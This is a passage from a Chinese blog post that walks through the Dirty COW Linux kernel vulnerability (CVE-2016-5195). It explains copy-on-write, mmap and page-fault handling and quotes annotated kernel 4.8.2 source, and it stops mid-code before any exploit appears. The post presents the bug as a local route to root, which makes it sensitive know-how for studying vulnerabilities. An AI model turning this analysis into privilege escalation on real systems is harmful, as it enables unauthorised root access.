

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/browser.jpg">
  <link rel="icon" href="/img/browser.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="korey0sh1">
  <meta name="keywords" content="">
  
    <meta name="description" content="Âó¶Âó¶Â¶ÆÁöÑdirty üêÇüêÇ">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2016-5195(Dirty Cow) Remake">
<meta property="og:url" content="http://example.com/2024/02/27/dirtycow/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="Âó¶Âó¶Â¶ÆÁöÑdirty üêÇüêÇ">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306210316.png">
<meta property="article:published_time" content="2024-02-27T03:01:04.000Z">
<meta property="article:modified_time" content="2024-03-06T13:09:49.261Z">
<meta property="article:author" content="korey0sh1">
<meta property="article:tag" content="OS">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="kernel">
<meta property="article:tag" content="CVE">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306210316.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>CVE-2016-5195(Dirty Cow) Remake - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ‰∏ªÈ¢ò‰æùËµñÁöÑÂõæÊ†áÂ∫ìÔºå‰∏çË¶ÅËá™Ë°å‰øÆÊîπ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  
    <!-- Google tag (gtag.js) -->
    <script async>
      if (!Fluid.ctx.dnt) {
        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
          window.dataLayer = window.dataLayer || [];
          function gtag() {
            dataLayer.push(arguments);
          }
          gtag('js', new Date());
          gtag('config', '');
        });
      }
    </script>
  

  

  

  

  



  
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>korey0sh1</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>È¶ñÈ°µ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>ÂΩíÊ°£</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>ÂàÜÁ±ª</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Ê†áÁ≠æ</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>ÂÖ≥‰∫é</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>ÂèãÈìæ</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240306210514.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="CVE-2016-5195(Dirty Cow) Remake"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        korey0sh1
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-02-27 11:01" pubdate>
          2024Âπ¥2Êúà27Êó• ‰∏äÂçà
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          7.6k Â≠ó
        
      </span>
    

    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> Ê¨°
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">CVE-2016-5195(Dirty Cow) Remake</h1>
            
              <p class="note note-info">
                
                  
                    Êú¨ÊñáÊúÄÂêéÊõ¥Êñ∞‰∫éÔºö2024Âπ¥3Êúà6Êó• Êôö‰∏ä
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <h1 id="0x00ÔºöÂÜôÂú®‰∏ÄÂàá‰πãÂâç"><a href="#0x00ÔºöÂÜôÂú®‰∏ÄÂàá‰πãÂâç" class="headerlink" title="0x00ÔºöÂÜôÂú®‰∏ÄÂàá‰πãÂâç"></a>0x00ÔºöÂÜôÂú®‰∏ÄÂàá‰πãÂâç</h1><p>ÊääA3üë¥ÁöÑkernel ‚Ö†Âíåkernel ‚Ö°ËøΩÂÆå‰∫Ü</p>
<p>Â∫∑Â∫∑ËÉΩ‰∏çËÉΩÂ§çÁé∞‰∏Ä‰∫õkernel CVE</p>
<h1 id="0x01Ôºö‰ø°ÊÅØÊî∂ÈõÜ"><a href="#0x01Ôºö‰ø°ÊÅØÊî∂ÈõÜ" class="headerlink" title="0x01Ôºö‰ø°ÊÅØÊî∂ÈõÜ"></a>0x01Ôºö‰ø°ÊÅØÊî∂ÈõÜ</h1><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2016-5195">NVD - CVE-2016-5195 (nist.gov)</a></p>
<p>2016Âπ¥10Êúà18Êó•ÔºåÈªëÂÆ¢<code>Phil Oester</code>Êèê‰∫§‰∫ÜÈöêËóèÈïøËææ9Âπ¥‰πã‰πÖÁöÑ‚ÄúËÑèÁâõÊºèÊ¥ûÔºà<strong>Dirty COW</strong>Ôºâ‚Äù0dayÊºèÊ¥û„ÄÇËØ•ÊºèÊ¥ûË°®Êòé<code>Linux</code>ÂÜÖÊ†∏ÁöÑÂÜÖÂ≠òÂ≠êÁ≥ªÁªüÂú®Â§ÑÁêÜÂÜôÊó∂Â§çÂà∂Ôºà<strong>Copy-on-Write</strong>)Êó∂Â≠òÂú®Êù°‰ª∂Á´û‰∫âÊºèÊ¥ûÔºåÂØºËá¥ÂèØ‰ª•Á†¥ÂùèÁßÅÊúâÂè™ËØªÂÜÖÂ≠òÊò†Â∞Ñ„ÄÇÈªëÂÆ¢ÂèØ‰ª•Ëé∑Âèñ‰ΩéÊùÉÈôêÁöÑÊú¨Âú∞Áî®Êà∑ÂêéÔºåÂà©Áî®Ê≠§ÊºèÊ¥ûËé∑ÂèñÂÖ∂‰ªñÂè™ËØªÂÜÖÂ≠òÊò†Â∞ÑÁöÑÂÜôÊùÉÈôêÔºåËøõ‰∏ÄÊ≠•Ëé∑ÂèñrootÊùÉÈôê„ÄÇ</p>
<p><strong>Dirty Cow</strong>Âú®2.xÂà∞4.8.2Âèä‰ª•‰∏ãÁöÑ<code>version</code>‰∏≠ÈÉΩÂèØ‰ª•ÂÆåÊàêÂà©Áî®Ôºå‰ΩúÁî®ËåÉÂõ¥ÂçÅÂàÜÂπøÊ≥õ„ÄÇÊúÄÂêéÔºåÊ≠§ÊºèÊ¥ûÁî±<code>linux</code>ÂàõÂßã‰∫∫<strong>linus</strong>‰∫≤Êâã‰øÆÂ§ç</p>
<h1 id="0x02ÔºöÂâçÁΩÆ"><a href="#0x02ÔºöÂâçÁΩÆ" class="headerlink" title="0x02ÔºöÂâçÁΩÆ"></a>0x02ÔºöÂâçÁΩÆ</h1><p><strong>Êñá‰∏≠ÊâÄÊúâÁöÑÊ∫êÁ†ÅÂùá‰∏∫4.8.2 version</strong></p>
<h2 id="COWÔºàcopy-to-writeÔºâ"><a href="#COWÔºàcopy-to-writeÔºâ" class="headerlink" title="COWÔºàcopy-to-writeÔºâ"></a>COWÔºàcopy-to-writeÔºâ</h2><p>ÂÜôÊó∂Â§çÂà∂Ôºà<strong>Copy-on-WriteÔºåCOW</strong>ÔºâÊòØ‰∏ÄÁßçËÆ°ÁÆóÊú∫ÁºñÁ®ã‰∏≠ÁöÑ‰ºòÂåñÊäÄÊúØÔºåÈÄöÂ∏∏Áî®‰∫éÂ§ÑÁêÜÂÖ±‰∫´Êï∞ÊçÆÁöÑÊÉÖÂÜµ„ÄÇÂú®‰ΩøÁî®ÂÜôÊó∂Â§çÂà∂Êó∂ÔºåÁ≥ªÁªü‰ºöÂú®Â§ö‰∏™ÂÆ¢Êà∑Á´ØÔºàÊàñËÄÖÁ∫øÁ®ãÔºâÂÖ±‰∫´Âêå‰∏Ä‰ªΩÊï∞ÊçÆÁöÑÊÉÖÂÜµ‰∏ãÔºåÂè™ÊúâÂú®Êúâ‰∏Ä‰∏™ÂÆ¢Êà∑Á´ØËØïÂõæ‰øÆÊîπÊï∞ÊçÆÊó∂Êâç‰ºöÂ§çÂà∂Êï∞ÊçÆÔºå‰ª•Á°Æ‰øù‰øÆÊîπÊìç‰Ωú‰∏ç‰ºöÂΩ±ÂìçÂÖ∂‰ªñÂÆ¢Êà∑Á´Ø„ÄÇ</p>
<p>ÂÖ∑‰ΩìÂà∞<code>fork()</code>‰∏≠Êù•ËØ¥ÔºåÁà∂ËøõÁ®ãÂíåÂ≠êËøõÁ®ãÂÖ±‰∫´Âêå‰∏Ä‰∏™È°µÊ°ÜÔºåÂè™ÊúâÂΩìÂÖ∂‰∏≠‰∏§Êñπ‰∏≠ÁöÑ‰ªªÊÑè‰∏ÄÊñπËØïÂõæ‰øÆÊîπËØ•È°µÊ°Ü‰∏≠ÁöÑÂÜÖÂÆπÊó∂ÔºåÊâç‰ºöÂàÜÈÖç‰∏Ä‰∏™Êñ∞ÁöÑÈ°µÊ°ÜÔºåÂ∞ÜÂéüÂÖàÈ°µÊ°ÜÁöÑÂÜÖÂÆπ<code>copy</code>Âà∞Êñ∞ÁöÑÈ°µÊ°ÜÔºåÂú®Êñ∞ÁöÑÈ°µÊ°ÜËøõË°å‰øÆÊîπ</p>
<ul>
<li><code>fork()</code>ÊâßË°åÂêéÔºåÁà∂Â≠êËøõÁ®ãÂÖ±‰∫´ÊâÄÊúâÈ°µÊ°ÜÔºåÊâÄÊúâÈ°µÊ°ÜË¢´Ê†áËÆ∞‰∏∫<code>read-only</code></li>
<li>ÂΩìË¶Å‰øÆÊîπÈ°µÊ°ÜÊó∂ÔºåÂõ†‰∏∫ÊòØ<code>read-only</code>ÔºåÊâÄ‰ª•‰ºöËß¶Âèë<code>page fault</code>ÔºàÁº∫È°µÂºÇÂ∏∏Ôºâ‚Äî‚ÄîÂÜÖÊ†∏Êâç‰ºöÂàÜÈÖç‰∏Ä‰∏™Êñ∞ÁöÑÈ°µÊ°Ü</li>
</ul>
<p>Â§ßËá¥ÊµÅÁ®ãÂ¶Ç‰∏ãÂõæÊâÄÁ§∫„ÄÇÂà´È™Ç‰∫ÜÂà´È™Ç‰∫ÜÁü•ÈÅìÊàëÂ≠ó‰∏ëÂëúÂëúÂëú:Ôºà</p>
<img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240301121649.png" srcset="/img/loading.gif" lazyload style="zoom:67%;" />

<img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240301121717.png" srcset="/img/loading.gif" lazyload style="zoom:67%;" />

<img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240301121748.png" srcset="/img/loading.gif" lazyload style="zoom:67%;" />



<h3 id="mmap‰∏éCOW"><a href="#mmap‰∏éCOW" class="headerlink" title="mmap‰∏éCOW"></a>mmap‰∏éCOW</h3><p>ÂΩìÊàë‰ª¨‰ΩøÁî® <code>mmap</code> Â∞Ü‰∏Ä‰∏™Êñá‰ª∂Êò†Â∞ÑÂà∞ÂÜÖÂ≠òÊó∂ÔºåÂπ∂‰∏îËØ•Êñá‰ª∂ÂÖ∑ÊúâÂè™ËØªÊùÉÈôêËÄåÊ≤°ÊúâÂÜôÊùÉÈôêÊó∂ÔºåËã•Êàë‰ª¨Â∞ùËØïÂêëËøô‰∏™Êò†Â∞ÑÂå∫ÂüüÂÜôÂÖ•Êï∞ÊçÆÔºåÁ≥ªÁªü‰ºöÂêØÂä®ÂÜôÊó∂Â§çÂà∂Ôºà<strong>copy-on-write</strong>ÔºâÊú∫Âà∂„ÄÇËøô‰ºöÂØºËá¥Á≥ªÁªüÂ∞ÜÊñá‰ª∂ÂÜÖÂÆπÁöÑÂâØÊú¨Êã∑Ë¥ùÂà∞ÂÜÖÂ≠ò‰∏≠Ôºå‰ª•‰æøËøõÁ®ãÂèØ‰ª•ÂØπËøô‰∏™Âå∫ÂüüËøõË°å‰øÆÊîπÔºåËÄå‰∏ç‰ºöÂΩ±ÂìçÂà∞Á°¨Áõò‰∏äÂéüÂßãÊñá‰ª∂ÁöÑÂÜÖÂÆπ„ÄÇ</p>
<h2 id="Áº∫È°µÂºÇÂ∏∏-page-fault"><a href="#Áº∫È°µÂºÇÂ∏∏-page-fault" class="headerlink" title="Áº∫È°µÂºÇÂ∏∏ page fault"></a>Áº∫È°µÂºÇÂ∏∏ page fault</h2><p>ÂΩìÊìç‰ΩúÁ≥ªÁªüÂ∞ùËØïËÆøÈóÆÂ≠òÂÇ®Âô®‰∏≠ÁöÑÈ°µÈù¢ÔºàÈ°µÔºâÊó∂ÔºåÂ¶ÇÊûúËØ•È°µÂΩìÂâç‰∏çÂú®‰∏ªÂ≠òÔºà<strong>RAM</strong>Ôºâ‰∏≠ÔºåÂ∞±‰ºöÂèëÁîüÁº∫È°µÂºÇÂ∏∏Ôºà<strong>page fault</strong>Ôºâ„ÄÇÁº∫È°µÂºÇÂ∏∏ÈÄöÂ∏∏ÊòØÁî±‰∫é‰ª•‰∏ãÂá†ÁßçÊÉÖÂÜµÂºïËµ∑ÁöÑÔºö</p>
<ol>
<li><strong>È°µÈù¢‰∏çÂú®ÂÜÖÂ≠ò‰∏≠</strong>ÔºöÂΩìÁ®ãÂ∫èÈúÄË¶ÅËÆøÈóÆ‰∏Ä‰∏™È°µÈù¢ÔºåËÄåËØ•È°µÈù¢Â∞öÊú™Âä†ËΩΩÂà∞ÂÜÖÂ≠ò‰∏≠Êó∂„ÄÇËøôÂèØËÉΩÊòØÂõ†‰∏∫È°µÈù¢ÊõæÁªèÂú®ÂÜÖÂ≠ò‰∏≠Ôºå‰ΩÜÂ∑≤ÁªèË¢´Êç¢Âá∫Âà∞Á£ÅÁõò‰∏äÔºåÊàñËÄÖÊòØÂõ†‰∏∫Á®ãÂ∫èËÆøÈóÆ‰∫Ü‰∏Ä‰∏™Êñ∞ÁöÑÈ°µÈù¢„ÄÇ</li>
<li><strong>ÈùûÊ≥ïËÆøÈóÆ</strong>ÔºöÁ®ãÂ∫èÂ∞ùËØïËÆøÈóÆÊú™Ë¢´ÂàÜÈÖçÁªôÂÆÉÁöÑÂÜÖÂ≠òÂå∫ÂüüÔºåÊàñËÄÖËÆøÈóÆÂ∑≤ÁªèË¢´ÈáäÊîæÁöÑÂÜÖÂ≠òÂå∫Âüü„ÄÇ</li>
<li><strong>È°µÈù¢‰øùÊä§</strong>ÔºöÁ®ãÂ∫èÂ∞ùËØïÂÜôÂÖ•Âè™ËØªÁöÑÂÜÖÂ≠òÂå∫ÂüüÔºåÊàñËÄÖÊâßË°åÊú™Ë¢´ÂÖÅËÆ∏ÁöÑÊìç‰Ωú„ÄÇ</li>
</ol>
<h3 id="Â§ÑÁêÜÊµÅÁ®ã"><a href="#Â§ÑÁêÜÊµÅÁ®ã" class="headerlink" title="Â§ÑÁêÜÊµÅÁ®ã"></a>Â§ÑÁêÜÊµÅÁ®ã</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__do_page_fault</span>()<br>	<span class="hljs-built_in">handle_mm_fault</span>()<br>		<span class="hljs-built_in">__handle_mm_fault</span>()<br>			<span class="hljs-built_in">handle_pte_fault</span>()<br>				<span class="hljs-built_in">do_fault</span>()<br>					<span class="hljs-built_in">do_cow_fault</span>()<br>				<span class="hljs-built_in">do_wp_page</span>()<br><br></code></pre></td></tr></table></figure>

<h4 id="do-page-fault"><a href="#do-page-fault" class="headerlink" title="__do_page_fault"></a>__do_page_fault</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This routine handles page faults.  It determines the address,</span><br><span class="hljs-comment"> * and the problem, and then passes it off to one of the appropriate</span><br><span class="hljs-comment"> * routines.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This function must have noinline because both callers</span><br><span class="hljs-comment"> * &#123;,trace_&#125;do_page_fault() have notrace on. Having this an actual function</span><br><span class="hljs-comment"> * guarantees there&#x27;s a function trace entry.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> noinline <span class="hljs-type">void</span><br>__do_page_fault(<span class="hljs-keyword">struct</span> pt_regs *regs, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> error_code,<br>		<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> address)<br>    <span class="hljs-comment">/*struct pt_regs *regsÔºö‰øùÂ≠ò‰∫ÜÈ°µÈù¢ÈîôËØØÂèëÁîüÊó∂ÁöÑ CPU ÂØÑÂ≠òÂô®Áä∂ÊÄÅ„ÄÇ</span><br><span class="hljs-comment">	  unsigned long error_codeÔºöÈîôËØØ‰ª£Á†ÅÔºåÁî®‰∫éÊåáÁ§∫È°µÈù¢ÈîôËØØÁöÑÁ±ªÂûã„ÄÇ</span><br><span class="hljs-comment">	  unsigned long addressÔºöÂºïÂèëÈ°µÈù¢ÈîôËØØÁöÑÂÜÖÂ≠òÂú∞ÂùÄ„ÄÇ*/</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">tsk</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span><br>	<span class="hljs-type">int</span> fault, major = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;<br>	<br>    <span class="hljs-comment">/*‰ªéÂΩìÂâç‰ªªÂä°ÁªìÊûÑ‰∏≠Ëé∑ÂèñÂÜÖÂ≠òÁÆ°ÁêÜÁªìÊûÑ mmÔºåÂπ∂ÈÄöËøáËØ•ÁªìÊûÑÊâæÂà∞Ëß¶ÂèëÈ°µÈù¢ÊïÖÈöúÁöÑÂú∞ÂùÄÊâÄÂ±ûÁöÑÂÜÖÂ≠òÂå∫Âüü vma*/</span><br>	tsk = current;<br>	mm = tsk-&gt;mm;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * Detect and handle instructions that would cause a page fault for</span><br><span class="hljs-comment">	 * both a tracked kernel page and a userspace page.</span><br><span class="hljs-comment">	 */</span><br>	<span class="hljs-keyword">if</span> (kmemcheck_active(regs))<br>		kmemcheck_hide(regs);<br>	prefetchw(&amp;mm-&gt;mmap_sem);<br><br>	<span class="hljs-keyword">if</span> (unlikely(kmmio_fault(regs, address)))<br>		<span class="hljs-keyword">return</span>;<br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">	 * We fault-in kernel-space virtual memory on-demand. The</span><br><span class="hljs-comment">	 * &#x27;reference&#x27; page table is init_mm.pgd.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * NOTE! We MUST NOT take any locks for this case. We may</span><br><span class="hljs-comment">	 * be in an interrupt or a critical region, and should</span><br><span class="hljs-comment">	 * only copy the information from the master page table,</span><br><span class="hljs-comment">	 * nothing more.</span><br><span class="hljs-comment">	 *</span><br><span class="hljs-comment">	 * This verifies that the fault happens in kernel space</span><br><span class="hljs-comment">	 * (error_code &amp; 4) == 0, and that the fault was not a</span><br><span class="hljs-comment">	 * protection error (error_code &amp; 9) == 